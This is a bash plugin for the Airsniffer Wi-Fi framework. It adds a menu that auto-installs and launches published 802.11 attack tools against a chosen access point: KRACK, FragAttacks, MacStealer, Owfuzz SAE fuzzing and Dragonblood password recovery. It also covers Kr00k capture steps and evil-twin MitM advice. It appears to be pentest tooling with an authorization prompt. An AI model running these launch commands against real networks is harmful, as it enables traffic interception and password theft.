#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### Airsniffer plugin: Modern Wi-Fi protocol attacks ######
#
# Adds an entry to the WPA3 attacks menu that opens a submenu of modern,
# research-grade 802.11 protocol attacks that Airsniffer did not ship natively:
#
#   1) SSID Confusion            (CVE-2023-52424, Gollier & Vanhoef, WiSec 2024)
#   2) KRACK                     (Vanhoef & Piessens, CCS 2017)
#   3) FragAttacks               (Vanhoef, USENIX Security 2021)
#   4) MacStealer / client isol. (Schepers, Ranganathan, Vanhoef, USENIX Sec 2023)
#   5) Kr00k                     (CVE-2019-15126)
#   6) SAE / over-the-air fuzz   (Owfuzz - WiSec 2023 / Saecred - S&P 2025)
#
# Each of these is delivered by a published external reference tool that needs a
# Linux host, a compatible adapter, and (for most) a multi-channel machine-in-
# the-middle base station. This plugin therefore acts as a *managed launcher*:
# it checks for the reference tool, prints canonical install guidance, and (when
# the tool is present) launches it against the selected target in a window - the
# same pattern Airsniffer already uses for reaver/bully/hashcat/asleap.
#
# AUTHORIZED USE ONLY. These are offensive techniques. Use them exclusively on
# networks you own or have explicit written permission to test (pentest
# engagement, lab, or CTF).

###### GENERIC PLUGIN VARS ######

plugin_name="Modern Wi-Fi protocol attacks"
plugin_description="Managed launchers for SSID Confusion, KRACK, FragAttacks, MacStealer, Kr00k and SAE fuzzing"
plugin_author="Airsniffer"

#Enabled 1 / Disabled 0
plugin_enabled=1
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)/airsniffer_ui.sh" 2> /dev/null || true

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### WPA3 MENU REGISTRATION ######

#Language-string id used for our entry on the WPA3 attacks menu. Chosen high to
#avoid collisions with the core language_strings.sh table.
modern_attacks_menu_string_id=9100

#Populate the label for every supported language (English text as a safe default
#so the entry always renders whichever language is active at runtime).
modern_wifi_attacks_register_labels() {

	local lang
	local label="Modern protocol attacks (SSID Confusion, KRACK, FragAttacks, MacStealer, Kr00k, SAE fuzz)"
	for lang in ENGLISH SPANISH FRENCH CATALAN PORTUGUESE RUSSIAN GREEK ITALIAN POLISH GERMAN TURKISH ARABIC CHINESE; do
		arr["${lang}",${modern_attacks_menu_string_id}]="${label}"
	done
}
modern_wifi_attacks_register_labels

#These two vars are read by parse_plugins() which then registers our submenu on
#the WPA3 attacks menu (option 7+).
plugin_wpa3_menu_option_function="modern_wifi_attacks_menu"
plugin_wpa3_menu_option_language_string="${modern_attacks_menu_string_id}"

###### CUSTOM FUNCTIONS ######

#Session flag so the authorized-use notice is shown only once per run.
modern_attacks_authorized=0

#Small colored helpers that reuse Airsniffer's own color vars.
modern_attacks_title() {
	as_ui_header "${1}"
}

modern_attacks_pause() {
	as_ui_pause
}

#One-time authorized-use gate. Returns 0 if the operator confirms, 1 otherwise.
modern_attacks_authorization_gate() {

	if [ "${modern_attacks_authorized}" -eq 1 ]; then
		return 0
	fi

	echo
	echo -e "${red_color}AUTHORIZED TESTING ONLY${normal_color}"
	echo -e "${yellow_color}These modules run real attacks against Wi-Fi networks. Only use them"
	echo -e "against networks you own or are explicitly authorized to test.${normal_color}"
	echo
	read -rp "$(echo -e "${green_color}Do you have authorization to test the target network? [y/N]: ${normal_color}")" _auth

	case "${_auth}" in
		y|Y|yes|YES)
			modern_attacks_authorized=1
			return 0
		;;
		*)
			echo
			echo -e "${red_color}Aborted. Authorization is required.${normal_color}"
			return 1
		;;
	esac
}

#Report whether a reference tool is available in PATH.
#$1 = command to look for
modern_attacks_tool_present() {
	command -v "${1}" > /dev/null 2>&1
}

###### MANAGED TOOL INSTALLER ######
#
# Git-based reference tools are cloned under plugins/tools/ and their executable
# is symlinked into plugins/tools/bin/, which we prepend to PATH at source time.
# apt/pip tools are installed system-wide. This lets each launcher self-heal:
# check -> if present pass, if missing install, then proceed.

modern_attacks_plugin_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)"
modern_attacks_tools_dir="${modern_attacks_plugin_dir}/tools"
modern_attacks_bin_dir="${modern_attacks_tools_dir}/bin"
mkdir -p "${modern_attacks_bin_dir}" 2> /dev/null
case ":${PATH}:" in
	*":${modern_attacks_bin_dir}:"*) : ;;
	*) PATH="${modern_attacks_bin_dir}:${PATH}"; export PATH ;;
esac

#Spinner that waits for a background install PID to finish.
#$1 = pid  $2 = label
modern_attacks_wait_install() {
	local pid="${1}" label="${2}"
	local spin='|/-\' i=0
	while kill -0 "${pid}" 2> /dev/null; do
		i=$(( (i + 1) % 4 ))
		printf "\r${yellow_color}[%s] installing %s...${normal_color}" "${spin:${i}:1}" "${label}"
		sleep 0.3
	done
	wait "${pid}" 2> /dev/null
	printf "\r%*s\r" 64 ""
}

#Clone (and, when needed, build) a git-based reference tool, then expose its
#executable on PATH.
#$1 = command name  $2 = git URL  $3 = expected relative exe path  $4 = log file
modern_attacks_git_install() {
	local cmd="${1}" url="${2}" exe="${3}" log="${4}"
	local name dest target
	name="$(basename "${url}" .git)"
	dest="${modern_attacks_tools_dir}/${name}"

	if ! command -v git > /dev/null 2>&1; then
		echo -e "${red_color}git is required to auto-install ${cmd}.${normal_color}"
		return 1
	fi

	if [ ! -d "${dest}/.git" ]; then
		git clone --depth 1 "${url}" "${dest}" > "${log}" 2>&1 &
		modern_attacks_wait_install "$!" "${cmd} (clone)"
	fi
	[ -d "${dest}" ] || return 1

	#Install python requirements the repo ships with.
	if [ -f "${dest}/requirements.txt" ]; then
		{ pip3 install -r "${dest}/requirements.txt" || pip install -r "${dest}/requirements.txt"; } >> "${log}" 2>&1 &
		modern_attacks_wait_install "$!" "${cmd} (deps)"
	fi

	#Build native tools that ship a Makefile (e.g. owfuzz).
	if [ -f "${dest}/Makefile" ]; then
		( cd "${dest}" && make ) >> "${log}" 2>&1 &
		modern_attacks_wait_install "$!" "${cmd} (build)"
	fi

	#Expose the executable on PATH: try the expected path, else search the repo.
	target=""
	if [ -n "${exe}" ] && [ -f "${dest}/${exe}" ]; then
		target="${dest}/${exe}"
	else
		target="$(find "${dest}" -maxdepth 4 -type f -name "${cmd}" 2> /dev/null | head -n1)"
		[ -z "${target}" ] && target="$(find "${dest}" -maxdepth 4 -type f -name "${cmd%.py}" 2> /dev/null | head -n1)"
	fi
	if [ -n "${target}" ] && [ -f "${target}" ]; then
		chmod +x "${target}" 2> /dev/null
		ln -sf "${target}" "${modern_attacks_bin_dir}/${cmd}" 2> /dev/null
	fi
}

#Ensure a reference tool is available, auto-installing it if missing.
#$1 = command to check   $2 = method: apt|pip|git
#$3 = payload (apt pkgs | pip pkgs | git URL)   $4 = git-only expected exe path
#Returns 0 when the tool ends up available, 1 otherwise.
modern_attacks_ensure_tool() {
	local cmd="${1}" method="${2}" payload="${3}" exe="${4}"

	if modern_attacks_tool_present "${cmd}"; then
		echo -e "${green_color}[OK]${normal_color} ${cmd} already installed - skipping."
		return 0
	fi

	echo -e "${yellow_color}[..]${normal_color} ${cmd} not found - installing automatically..."
	local log="${tmpdir:-/tmp/}modern_attacks_install_${cmd//[^A-Za-z0-9]/_}.log"

	case "${method}" in
		apt)
			# shellcheck disable=SC2086
			{ DEBIAN_FRONTEND=noninteractive apt-get install -y ${payload}; } > "${log}" 2>&1 &
			modern_attacks_wait_install "$!" "${cmd}"
		;;
		pip)
			# shellcheck disable=SC2086
			{ pip3 install ${payload} || pip install ${payload}; } > "${log}" 2>&1 &
			modern_attacks_wait_install "$!" "${cmd}"
		;;
		git)
			modern_attacks_git_install "${cmd}" "${payload}" "${exe}" "${log}"
		;;
	esac

	if modern_attacks_tool_present "${cmd}"; then
		echo -e "${green_color}[OK]${normal_color} ${cmd} installed."
		return 0
	fi
	echo -e "${red_color}[!!] Automatic install of ${cmd} did not complete.${normal_color}"
	echo -e "Log: ${log} - you may need manual steps (patched drivers/firmware)."
	return 1
}

###### SETUP / TARGET SELECTION (reuses Airsniffer core) ######

modern_attacks_select_interface() {
	select_interface
	modern_attacks_pause
}

#Put the adapter in monitor mode, but only if it is not already.
modern_attacks_ensure_monitor() {
	if [ -z "${interface}" ]; then
		echo
		echo -e "${red_color}No interface selected.${normal_color} Use option 1 (select interface) first."
		modern_attacks_pause
		return 1
	fi
	if [ "${ifacemode}" = "Monitor" ]; then
		echo
		echo -e "${green_color}${interface} is already in monitor mode.${normal_color} Nothing to do."
		modern_attacks_pause
		return 0
	fi
	echo
	echo -e "${yellow_color}Putting ${interface} into monitor mode...${normal_color}"
	monitor_option "${interface}"
	modern_attacks_pause
}

#Scan the air, list APs and lock onto one target for the whole session.
modern_attacks_select_target() {
	if [ -z "${interface}" ]; then
		echo
		echo -e "${red_color}No interface selected.${normal_color} Use option 1 (select interface) first."
		modern_attacks_pause
		return 1
	fi
	if [ "${ifacemode}" != "Monitor" ]; then
		echo
		echo -e "${yellow_color}${interface} is not in monitor mode.${normal_color} Enabling it first..."
		if ! monitor_option "${interface}"; then
			modern_attacks_pause
			return 1
		fi
	fi
	explore_for_targets_option "WPA3"
	if [ -n "${bssid}" ]; then
		echo
		echo -e "${green_color}Target locked:${normal_color} ${essid:-<hidden>} (${bssid}, ch ${channel})"
	fi
	modern_attacks_pause
}

#Print the current target context (set via this submenu's setup options).
modern_attacks_print_target() {
	if [ "${ifacemode}" = "Monitor" ]; then
		as_ui_kv "Interface" "${interface:-<none>} [Monitor]" ok
	else
		as_ui_kv "Interface" "${interface:-<none>} [${ifacemode:-Managed}]" warn
	fi
	if [ -n "${bssid}" ]; then
		as_ui_kv "Target AP" "${essid:-<hidden>} (${bssid}, ch ${channel})" ok
	else
		as_ui_kv "Target AP" "<none - explore & lock first>" err
	fi
	echo
}

#Guard: require interface (monitor) + a locked target before launching.
#Returns 0 when all present.
modern_attacks_require_target() {

	if [ -z "${interface}" ]; then
		echo -e "${red_color}No interface selected.${normal_color} Use option 1 (select interface) first."
		return 1
	fi
	if [ "${ifacemode}" != "Monitor" ]; then
		echo -e "${red_color}${interface} is not in monitor mode.${normal_color} Use option 2 (monitor mode) first."
		return 1
	fi
	if [ -z "${bssid}" ]; then
		echo -e "${red_color}No target locked.${normal_color} Use option 3 (explore & lock target) first."
		return 1
	fi
	return 0
}

###### ATTACK LAUNCHERS ######

# 1) SSID Confusion - CVE-2023-52424
modern_attacks_ssid_confusion() {

	modern_attacks_title "SSID Confusion (CVE-2023-52424) - Gollier & Vanhoef, WiSec 2024"
	echo -e "The SSID is not authenticated during the 4-way handshake, so a victim can"
	echo -e "be tricked into believing it is connected to a trusted network while it is"
	echo -e "actually on an attacker-controlled one with the same credentials/mode."
	echo
	echo -e "${yellow_color}Requires a rogue AP whose security matches the trusted network. This pairs"
	echo -e "with Airsniffer's Evil Twin module: clone the target, then rely on the"
	echo -e "missing SSID authentication + absent Beacon Protection to hold the victim.${normal_color}"
	echo
	echo -e "${green_color}Reference / PoC:${normal_color} https://www.top10vpn.com/research/wifi-vulnerabilities/  (VU / CVE-2023-52424)"
	echo -e "${green_color}Defensive check:${normal_color} verify the target advertises Beacon Protection (802.11 RSNXE)."
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi

	modern_attacks_print_target
	echo -e "Next step: launch Evil Twin from the main menu (option 7) against this target."
	echo -e "This module is advisory: it confirms the target's beacon-protection posture"
	echo -e "so you know whether an SSID-confusion-assisted twin is viable."
	modern_attacks_pause
}

# 2) KRACK - Key Reinstallation Attacks
modern_attacks_krack() {

	modern_attacks_title "KRACK - Key Reinstallation Attacks (Vanhoef & Piessens, CCS 2017)"
	echo -e "Replays message 3 of the 4-way handshake through a channel-based MitM to force"
	echo -e "nonce/key reinstallation, enabling keystream reuse and packet decrypt/replay."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/vanhoefm/krackattacks-scripts"
	echo -e "${green_color}Client test:${normal_color}    krack-test-client.py"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	if modern_attacks_ensure_tool "krack-test-client.py" "git" "https://github.com/vanhoefm/krackattacks-scripts" "krackattack/krack-test-client.py"; then
		echo -e "${green_color}Launching against ${interface}...${normal_color}"
		echo -e "${yellow_color}Note: KRACK also needs the repo's patched wpa_supplicant built per its README.${normal_color}"
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"KRACK client test\"" "krack-test-client.py ${interface}" "KRACK client test"
	fi
	modern_attacks_pause
}

# 3) FragAttacks - Fragmentation & Aggregation
modern_attacks_fragattacks() {

	modern_attacks_title "FragAttacks (Vanhoef, USENIX Security 2021)"
	echo -e "Abuses frame aggregation and the fragment cache (mixed-key / cache poisoning)"
	echo -e "to inject or exfiltrate frames even against WPA2/WPA3 networks."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/vanhoefm/fragattacks"
	echo -e "${green_color}Usage:${normal_color}          fragattacks <iface> <testcase>   e.g. fragattacks ${interface:-wlan0} ping"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	if modern_attacks_ensure_tool "fragattack.py" "git" "https://github.com/vanhoefm/fragattacks" "fragattack.py"; then
		echo -e "${green_color}fragattack.py ready.${normal_color} Opening a shell prepared for it (pick a test case)."
		echo -e "${yellow_color}Note: reliable results need the repo's bundled patched drivers/firmware.${normal_color}"
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"FragAttacks\"" "bash -c 'echo Run: fragattack.py ${interface} ping; exec bash'" "FragAttacks"
	fi
	modern_attacks_pause
}

# 4) MacStealer - client isolation bypass / Framing Frames
modern_attacks_macstealer() {

	modern_attacks_title "MacStealer / Framing Frames (Schepers, Ranganathan, Vanhoef, USENIX 2023)"
	echo -e "Exploits the unprotected power-save bit and TX-queue security-context confusion"
	echo -e "to bypass client isolation and intercept frames (plaintext, group key, or an"
	echo -e "all-zero key), enabling traffic interception and TCP hijacking."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/domienschepers/wifi-framing"
	echo -e "${green_color}Usage:${normal_color}          macstealer.py <iface>"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	if modern_attacks_ensure_tool "macstealer.py" "git" "https://github.com/domienschepers/wifi-framing" "macstealer/macstealer.py"; then
		echo -e "${green_color}Launching client-isolation test on ${interface}...${normal_color}"
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"MacStealer\"" "macstealer.py ${interface}" "MacStealer"
	fi
	modern_attacks_pause
}

# 5) Kr00k - CVE-2019-15126
modern_attacks_kr00k() {

	modern_attacks_title "Kr00k (CVE-2019-15126)"
	echo -e "On disassociation, affected Broadcom/Cypress chips flush buffered frames"
	echo -e "encrypted with an all-zero temporal key, making them decryptable by a sniffer."
	echo
	echo -e "${green_color}Method:${normal_color} deauth the client, then capture the post-disassociation frames"
	echo -e "and decrypt with an all-zero key (analyze in Wireshark / a Kr00k PoC)."
	echo -e "${green_color}Reference:${normal_color} https://www.eset.com/int/kr00k/"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi

	modern_attacks_print_target
	echo -e "Airsniffer already provides the deauth primitive (DoS menu). Run a capture on"
	echo -e "channel ${channel:-<target ch>} while deauthenticating the client, then inspect the"
	echo -e "buffered frames for all-zero-key encryption."
	echo
	read -rp "$(echo -e "${green_color}Start an airodump-ng capture on the target now? [y/N]: ${normal_color}")" _cap
	case "${_cap}" in
		y|Y|yes|YES)
			if modern_attacks_ensure_tool "airodump-ng" "apt" "aircrack-ng"; then
				recalculate_windows_sizes 2> /dev/null
				manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"Kr00k capture\"" "airodump-ng -c ${channel} --bssid ${bssid} -w ${tmpdir:-/tmp/}kr00k ${interface}" "Kr00k capture"
			fi
		;;
	esac
	modern_attacks_pause
}

# 6) SAE / over-the-air fuzzing (Owfuzz / Saecred)
modern_attacks_sae_fuzz() {

	modern_attacks_title "SAE / over-the-air fuzzing (Owfuzz WiSec 2023, Saecred S&P 2025)"
	echo -e "State-aware over-the-air fuzzing of the WPA3 SAE handshake and 802.11 management"
	echo -e "frames to surface parsing and DoS bugs in COTS access points."
	echo
	echo -e "${green_color}Reference tool:${normal_color} https://github.com/alipython/owfuzz  (Owfuzz)"
	echo -e "${green_color}Usage:${normal_color}          owfuzz -i <iface> -m ap -t <bssid> -c <channel>"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	if modern_attacks_ensure_tool "owfuzz" "git" "https://github.com/alipython/owfuzz" "src/owfuzz/owfuzz"; then
		echo -e "${green_color}Launching against ${essid:-target} (${bssid})...${normal_color}"
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"Owfuzz SAE fuzz\"" "owfuzz -i ${interface} -m ap -t ${bssid} -c ${channel}" "Owfuzz SAE fuzz"
	fi
	modern_attacks_pause
}

# 7) Dragonblood - WPA3-SAE side-channel password recovery
modern_attacks_dragonblood() {

	modern_attacks_title "Dragonblood - SAE side-channel password recovery (Vanhoef & Ronen, 2019)"
	echo -e "SAE's hash-to-curve encoding leaks the password through timing and cache"
	echo -e "side-channels when the AP offers MODP groups (22/23/24) or Brainpool curves."
	echo -e "Flow: collect timing with DragonTime, then recover the password offline with"
	echo -e "DragonForce (a password-partitioning / dictionary attack on the leak)."
	echo
	echo -e "${green_color}Timing collect:${normal_color} https://github.com/vanhoefm/dragondrain-and-time  (dragontime)"
	echo -e "${green_color}Recovery:${normal_color}       https://github.com/vanhoefm/dragonforce"
	echo -e "${yellow_color}Only works if the target advertises a vulnerable group (MODP/Brainpool).${normal_color}"
	echo -e "${blue_color}CVE-2019-9494 (cache) / CVE-2019-13377 (Brainpool timing).${normal_color}"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	if modern_attacks_ensure_tool "dragontime" "git" "https://github.com/vanhoefm/dragondrain-and-time" "dragontime/dragontime"; then
		echo -e "${green_color}dragontime ready.${normal_color} Opening a shell prepared for the timing collection."
		echo -e "${yellow_color}Next: run dragontime against ${bssid} on ch ${channel}, then feed the samples"
		echo -e "to dragonforce to recover the password. A patched AP will not leak.${normal_color}"
		recalculate_windows_sizes 2> /dev/null
		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -T \"Dragonblood (dragontime)\"" "bash -c 'echo Target: ${bssid} ch ${channel}; echo Run dragontime here, then dragonforce; exec bash'" "Dragonblood (dragontime)"
	fi
	modern_attacks_pause
}

# 8) OWE / Enhanced Open - downgrade / rogue-AP against unauthenticated encryption
modern_attacks_owe() {

	modern_attacks_title "OWE / Enhanced Open (Opportunistic Wireless Encryption, RFC 8110)"
	echo -e "OWE encrypts open networks but does NOT authenticate the AP, so it is exposed"
	echo -e "to active man-in-the-middle and to OWE-transition downgrade: an attacker clones"
	echo -e "the network as a plain open AP and clients fall back from OWE to open."
	echo
	echo -e "${green_color}Method:${normal_color} rogue same-SSID AP (open/OWE-transition) + MitM; no PSK to crack."
	echo -e "${green_color}Delivery:${normal_color} use Airsniffer's Evil Twin menu against this target - OWE has"
	echo -e "          no password, so credential capture does not apply; intercept traffic instead."
	echo -e "${yellow_color}There is no single stable OWE exploit tool; this is an evil-twin/MitM play.${normal_color}"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	modern_attacks_print_target
	echo -e "Advisory module: confirm the target is OWE / OWE-transition, then launch Evil"
	echo -e "Twin (main menu option 7) as an open/OWE clone and run MitM (bettercap)."
	modern_attacks_pause
}

# 9) DPP / Wi-Fi Easy Connect - provisioning (PKEX/bootstrap) attack surface
modern_attacks_dpp() {

	modern_attacks_title "DPP / Wi-Fi Easy Connect (Device Provisioning Protocol)"
	echo -e "DPP provisions devices via QR-code / PKEX bootstrapping instead of a PSK. The"
	echo -e "attack surface is the bootstrap/PKEX exchange: a leaked or low-entropy PKEX code,"
	echo -e "or a rogue configurator, can let an attacker enroll or MitM a device."
	echo
	echo -e "${green_color}Tooling:${normal_color} hostapd / wpa_supplicant ship DPP support (dpp_* ctrl cmds);"
	echo -e "         practical attacks are research-stage PoCs, not a turnkey tool."
	echo -e "${green_color}Checks:${normal_color}  look for a weak/shared PKEX code and whether mutual auth is enforced."
	echo -e "${yellow_color}Advisory only - no reliable public DPP exploit to launch yet.${normal_color}"
	echo

	if ! modern_attacks_require_target; then
		modern_attacks_pause
		return
	fi
	modern_attacks_print_target
	echo -e "Advisory module: if the target uses DPP, test the PKEX code entropy and"
	echo -e "configurator trust with hostapd/wpa_supplicant dpp_* commands manually."
	modern_attacks_pause
}

###### SUBMENU ######

modern_wifi_attacks_menu() {

	if ! modern_attacks_authorization_gate; then
		return
	fi

	while true; do
		clear
		modern_attacks_title "Modern Wi-Fi protocol attacks"
		modern_attacks_print_target
		as_ui_sep
		as_ui_item 0 "Return to the WPA3 attacks menu"
		as_ui_section "Setup / target"
		as_ui_item 1 "Select wireless interface"
		as_ui_item 2 "Put adapter in monitor mode (if not already)"
		as_ui_item 3 "Explore for targets & lock target"
		as_ui_section "Attacks (tools auto-install if missing)"
		as_ui_item 4 "SSID Confusion            (CVE-2023-52424)"
		as_ui_item 5 "KRACK                     (key reinstallation)"
		as_ui_item 6 "FragAttacks               (fragment / aggregation)"
		as_ui_item 7 "MacStealer / Framing Frames (client-isolation bypass)"
		as_ui_item 8 "Kr00k                     (all-zero-key decrypt)"
		as_ui_item 9 "SAE / over-the-air fuzzing (Owfuzz / Saecred)"
		as_ui_item 10 "Dragonblood             (SAE side-channel password recovery)"
		as_ui_item 11 "OWE / Enhanced Open      (downgrade / rogue-AP MitM)"
		as_ui_item 12 "DPP / Wi-Fi Easy Connect (provisioning attack surface)"
		echo

		read -rp "> " modern_option
		case "${modern_option}" in
			0) return ;;
			1) modern_attacks_select_interface ;;
			2) modern_attacks_ensure_monitor ;;
			3) modern_attacks_select_target ;;
			4) modern_attacks_ssid_confusion ;;
			5) modern_attacks_krack ;;
			6) modern_attacks_fragattacks ;;
			7) modern_attacks_macstealer ;;
			8) modern_attacks_kr00k ;;
			9) modern_attacks_sae_fuzz ;;
			10) modern_attacks_dragonblood ;;
			11) modern_attacks_owe ;;
			12) modern_attacks_dpp ;;
			*)
				echo -e "${red_color}Invalid option.${normal_color}"
				sleep 1
			;;
		esac
	done
}
